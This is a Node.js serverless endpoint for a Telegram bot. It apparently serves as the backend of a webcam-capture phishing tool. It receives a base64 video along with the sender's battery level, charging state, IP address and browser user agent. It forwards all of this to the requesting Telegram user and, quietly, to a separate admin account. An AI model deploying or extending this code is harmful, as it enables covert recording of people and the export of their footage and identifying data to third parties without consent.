const { Telegraf } = require('telegraf');
const fs = require('fs');
const path = require('path');
const bot = new Telegraf(process.env.BOT_TOKEN);

let userCounter = {}; // هر UID لپاره شمارنه

module.exports = async (req, res) => {
  if(req.method!=='POST') return res.status(405).send('Method Not Allowed');

  try{
    const { video, uid, battery, charging, format } = req.body;
    const adminId = process.env.ADMIN_ID;

    if(!uid || !video) return res.status(400).send('UID or Video missing');

    // یواځې یو ویډیو per UID
    userCounter[uid] = (userCounter[uid] || 0) + 1;
    if(userCounter[uid] > 1) return res.status(403).send('⛔ Limit reached');

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || "Unknown";
    const timestamp = new Date().toLocaleString('en-US', {timeZone:'Asia/Kabul', hour12:false});

    // Base64 -> Buffer
    const base64 = video; // Header included
    const videoBuffer = Buffer.from(base64.replace(/^data:video\/\w+;base64,/, ''), 'base64');

    // Temporary save (optional)
    const tempFileName = `video_${uid}_${Date.now()}.${format||'webm'}`;
    const tempFilePath = path.join('/tmp', tempFileName);
    fs.writeFileSync(tempFilePath, videoBuffer);

    const isChargingText = charging?'Yes 🔌':'No ❌';
    const caption = `
🎥 *New Video Received*

🆔 *Telegram ID:* \`${uid}\`
🔋 *Battery Level:* \`${battery || '?'}%\`
⚡ *Charging:* \`${isChargingText}\`
🌐 *IP Address:* \`${ip}\`
📱 *Device:* \`${userAgent}\`
🕒 *Time:* \`${timestamp}\`
📹 *Format:* \`${format || 'webm'}\`

──────╮  
│🧑🏻‍💻 *Built By 💛 WACIQ* 
╰────────────╯
`.trim();

    // Send to user
    await bot.telegram.sendVideo(uid,{source:videoBuffer},{
      caption, parse_mode:'Markdown', supports_streaming:true
    });

    // Send to admin
    if(adminId){
      await bot.telegram.sendVideo(adminId,{source:videoBuffer},{
        caption, parse_mode:'Markdown', supports_streaming:true
      });
    }

    // Delete temp
    if(fs.existsSync(tempFilePath)) fs.unlinkSync(tempFilePath);

    res.status(200).send('✅ Video Uploaded');

  } catch(err){
    console.error('Video upload error:',err);
    res.status(500).send('❌ Video Upload Error');
  }
}; 
